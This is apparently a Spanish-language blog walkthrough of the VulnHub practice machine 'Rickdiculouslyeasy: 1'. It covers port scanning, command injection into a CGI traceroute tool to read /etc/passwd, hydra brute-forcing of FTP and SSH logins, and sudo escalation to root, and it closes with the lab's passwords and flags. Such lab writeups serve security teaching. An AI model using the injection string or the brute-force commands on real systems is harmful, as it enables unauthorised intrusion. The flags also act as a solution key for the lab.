---
title: "Rickdiculouslyeasy: 1"
excerpt: "[Easy][Vulnhub] Writeup de Rickdiculouslyeasy: 1."
header:
 teaser: ""
tags:
  - vulnhub
  - easy
  - writeup
categories:
  - vulnhub
---

[https://www.vulnhub.com/entry/rickdiculouslyeasy-1,207/](https://www.vulnhub.com/entry/rickdiculouslyeasy-1,207/)

Realizar un escaneo nmap a la red para buscar el equipo

```bash
sudo nmap -vvv -sS -sV -O -Pn 192.168.122.0/24
```

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/rickdiculouslyeasy/1.png){: .align-center}

Saldrá una máquina con varios puertos abiertos

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/rickdiculouslyeasy/2.png){: .align-center}

Realizar un escaneo nmap profundo
```bash
sudo nmap -vvv -sS -sV -sC -O -p- -Pn 192.168.122.11 -oG allports
```

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/rickdiculouslyeasy/3.png){: .align-center}

Se podrá encontrar una flag entre toda la información

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/rickdiculouslyeasy/4.png){: .align-center}

Entrar en la web

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/rickdiculouslyeasy/5.png){: .align-center}

Buscar directorios ocultos en la web, aparecerá un `robots.txt`
```bash
sudo gobuster dir -u 192.168.122.11 -w /usr/share/wordlists/dirb/big.txt
```

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/rickdiculouslyeasy/6.png){: .align-center}

Ir a `/passwords`, saldrá una flag y un archivo llamado `passwords.html`

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/rickdiculouslyeasy/7.png){: .align-center}

Ir a flag, mostrará una de las flags

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/rickdiculouslyeasy/8.png){: .align-center}

Ir a passwords.html

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/rickdiculouslyeasy/9.png){: .align-center}

Mostrar el código fuente, mostrará una contraseña

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/rickdiculouslyeasy/10.png){: .align-center}

Ir a `robots.txt` también visto con el gobuster, mostrará tres rutas

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/rickdiculouslyeasy/11.png){: .align-center}

El primer directorio no mostrará nada relevante
Ir al segundo directorio `/cgi-bin-tracertool.cgi`, mostrará una herramienta que servirá para ejecutar un tracert desde la máquina víctima a una IP que sea escrita

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/rickdiculouslyeasy/12.png){: .align-center}

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/rickdiculouslyeasy/13.png){: .align-center}

Al probar a concatenar comandos funcionará. Es importante cerrar el tracert con un punto y coma para seguidamente introducir el comando deseado como se ve en la imagen.

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/rickdiculouslyeasy/14.png){: .align-center}

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/rickdiculouslyeasy/15.png){: .align-center}

Tratar de mostrar archivos del equipo, en este caso el `/etc/passwd`

```bash
; tail /etc/pass
```

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/rickdiculouslyeasy/16.png){: .align-center}

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/rickdiculouslyeasy/17.png){: .align-center}

Aparecerán varios usuarios que añadiremos en un diccionario de usuarios, los usuarios son:

- RickSanchez
- Summer
- Morty
Añadirlos a un diccionario de usuarios del siguiente modo

```bash
cat >> users.txt
```

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/rickdiculouslyeasy/18.png){: .align-center}

Buscar el usuario al que pertenece la contraseña vista anteriormente en `passwords.html` utilizando hydra y el diccionario creado en el paso anterior, en este caso será al servidor ftp. Saldrá que la contraseña es del usuario `Summer`.

```bash
sudo hydra -L users.txt -p winter 192.168.122.11 ftp
```

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/rickdiculouslyeasy/19.png){: .align-center}

Entrar por ftp con el usuario `Summer` y la contraseña `winter`

```bash
ftp 192.168.122.11
```

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/rickdiculouslyeasy/20.png){: .align-center}

Descargar el archivo `FLAG.txt`

```bash
get FLAG.txt
```

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/rickdiculouslyeasy/21.png){: .align-center}

Leer el archivo `FLAG.txt`

```bash
cat FLAG.txt
```

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/rickdiculouslyeasy/22.png){: .align-center}

Tratar de entrar por ftp de forma anónima

```bash
ftp 192.168.122.11
```

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/rickdiculouslyeasy/23.png){: .align-center}

Descargar el archivo `FLAG.txt`

```bash
get FLAG.txt
```

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/rickdiculouslyeasy/24.png){: .align-center}

Leer el archivo `FLAG.txt`

```bash
cat FLAG.txt
```

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/rickdiculouslyeasy/25.png){: .align-center}

Tratar de entrar por ssh con el usuario Summer y la contraseña `winter`. Como se puede ver en los puertos aparecen `22` y `22222`. Esto es porque el servidor SSH ha sido configurado para usar el puerto `22222`, es por esto que habrá que especificarlo.

```bash
ssh Summer@192.168.122.11 -p 22222  
```

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/rickdiculouslyeasy/26.png){: .align-center}

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/rickdiculouslyeasy/27.png){: .align-center}

Dará acceso al equipo, mostrar el contenido del directorio actual.

```bash
ls
```

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/rickdiculouslyeasy/28.png){: .align-center}

Al intentar leer el archivo FLAG.txt con el comando cat aparecerá un gato, esto obliga a utilizar otro método para leerlo como puede ser el comando `tail`, `head` o `base64`

```bash
cat FLAG.txt
```

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/rickdiculouslyeasy/29.png){: .align-center}

Usar `tail` para leer el archivo

```bash
tail FLAG.txt
```

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/rickdiculouslyeasy/30.png){: .align-center}

Ir al directorio anterior y mostrar el contenido para mostrar los directorios personales de los otros usuarios del sistema

```bash
cd ..
ls
```

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/rickdiculouslyeasy/31.png){: .align-center}

Ir a Morty y mostrar el contenido

```bash
cd Morty/
ls
```

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/rickdiculouslyeasy/32.png){: .align-center}

Comprobar que el archivo `Safe_Password.jpg` es realmente una imagen

```bash
file Safe_Password.jpg
```

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/rickdiculouslyeasy/33.png){: .align-center}

Leer el contenido del archivo para comprobar que no haya nada oculto en el código de la imagen , mostrará una contraseña que es `Meeseek`

```bash
head Safe_Password.jpg
```

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/rickdiculouslyeasy/34.png){: .align-center}

Descomprimir el archivo `journal.txt.zip` con la contraseña Meeseek, mostrará otra flag y también la contraseña para algún archivo que es seguro

```bash
unzip -c journal.txt.zip
```

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/rickdiculouslyeasy/35.png){: .align-center}

Ir al directorio personal de `RickSanchez` y dentro de él a `RICKS_SAFE/`

```bash
cd ../RickSanchez
ls
cd RICKS_SAFE/
```

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/rickdiculouslyeasy/36.png){: .align-center}

Al tratar de ejecutar el archivo no será posible por los permisos

```bash
./safe
```

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/rickdiculouslyeasy/37.png){: .align-center}

Copiar el archivo al directorio personal de Summer

```bash
cp safe ../../Summer/
cd
```

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/rickdiculouslyeasy/38.png){: .align-center}

Ejecutar el script con la contraseña conseguida anteriormente en el archivo comprimido de Morty. Mostrará una pista para otra contraseña, la pista es que la contraseña cumple los siguientes requisitos:

```bash
./safe 131333
```
- Una letra mayúscula
- Un dígito
- Una de las palabras del nombre de su antigua banda

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/rickdiculouslyeasy/39.png){: .align-center}

Al buscar información sobre su antigua banda se podrá encontrar el nombre de `"The Flesh Curtains"`

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/rickdiculouslyeasy/40.png){: .align-center}

Crear un diccionario de contraseñas utilizando `Maskprocessor`, este programa permite crear ficcionarios especificando patrones. (ZSH no rinde bien con caracteres especiales cómo "?", por ello utilizo bash para este paso)

`mp64 ?u?dCurtains      <- ?u Significará una letra mayúscula, ?d Significará un dígito del 0 al 9`

Especificar tanto para los nombres flesh y curtains tanto en mayúscula como en minúscula

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/rickdiculouslyeasy/41.png){: .align-center}

Utilizar `hydra` para encontrar la contraseña del usuario RickSanchez con el diccionario creado anteriormente y con el puerto 22222. Después de un tiempo mostrará la contraseña del usuario RickSanchez

```bash
sudo hydra -t 64 -l RickSanchez -P names.txt 192.168.122.11 ssh -s 22222
```

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/rickdiculouslyeasy/42.png){: .align-center}

Cambiar al usuario RickSanshez

```bash
su RickSanchez
```

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/rickdiculouslyeasy/43.png){: .align-center}

Ver los permisos de RickSanchez, mostrará que tiene todos los permisos

```bash
sudo -l
```

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/rickdiculouslyeasy/44.png){: .align-center}

Cambiar al usuario root

```bash
sudo su
```

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/rickdiculouslyeasy/45.png){: .align-center}

Ir al directorio /root y mostrar el contenido

```bash
cd /root
ls
```

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/rickdiculouslyeasy/46.png){: .align-center}

Leer el archivo FLAG.txt

```bash
tail FLAG.txt
```

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/rickdiculouslyeasy/47.png){: .align-center}

Puede encontrarse otra flag accediendo a le web con el puerto `9090`

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/rickdiculouslyeasy/48.png){: .align-center}

## Flags

FLAG:{TheyFoundMyBackDoorMorty}-10Points\n")

FLAG{Yeah d- just don't do it.} - 10 Points

FLAG{Whoa this is unexpected} - 10 Points

FLAG{Get off the high road Summer!} - 10 Points

FLAG: {131333} - 20 Points

FLAG{And Awwwaaaaayyyy we Go!} - 20 Points

FLAG: {Ionic Defibrillator} - 30 points

FLAG {There is no Zeus, in your face!} - 10 Points  

Total 120/130
